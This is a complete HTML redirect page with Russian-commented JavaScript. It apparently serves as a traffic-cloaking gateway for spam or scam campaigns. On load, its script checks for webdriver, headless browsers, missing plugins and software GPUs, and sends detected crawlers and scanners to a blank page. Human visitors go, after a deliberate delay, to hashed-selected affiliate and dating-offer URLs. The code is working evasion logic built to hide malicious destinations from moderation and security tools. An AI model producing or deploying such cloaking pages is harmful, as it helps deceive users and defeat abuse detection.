<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <script>
    const offers = [
      "https://sisuny.top/click?o=2&a=6549&sub_id1=pysmom",
      "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=212364&s2=2183582"
    ];

    /* ------------------ АНТИБОТ ------------------ */
    function isBot() {
      const ua = navigator.userAgent.toLowerCase();

      // 1. Явный webdriver
      if (navigator.webdriver) return true;

      // 2. Нет плагинов
      if (navigator.plugins.length === 0) return true;

      // 3. Нет языков
      if (!navigator.languages || navigator.languages.length === 0) return true;

      // 4. Headless браузеры
      if (ua.includes("headless") || ua.includes("phantomjs")) return true;

      // 5. WebGL → GPU
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return true;

        const ext = gl.getExtension("WEBGL_debug_renderer_info");
        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);

        if (renderer) {
          const badGPU = ["swiftshader", "mesa", "llvmpipe", "software"];
          if (badGPU.some(g => renderer.toLowerCase().includes(g))) return true;
        }
      } catch (e) {
        return true;
      }

      return false; // человек
    }

    /* ------------------ РАНДОМ ОФФЕРА ------------------ */
    function hashString(str) {
      let h = 0;
      for (let i = 0; i < str.length; i++) {
        h = ((h << 5) - h) + str.charCodeAt(i);
        h |= 0;
      }
      return Math.abs(h);
    }

    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 20)); // 20 мин
    const seed = navigator.userAgent + sessionSalt;
    const offerIndex = hashString(seed) % offers.length;

    /* ------------------ РЕДИРЕКТ ------------------ */
    function go() {
      if (isBot()) {
        // бот → пустая страница
        window.location.replace("about:blank");
        return;
      }

      const url = offers[offerIndex];

      // мягкая задержка для реалистичности
      setTimeout(() => {
        window.location.href = url;
      }, 350);
    }

    document.addEventListener("DOMContentLoaded", go);
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
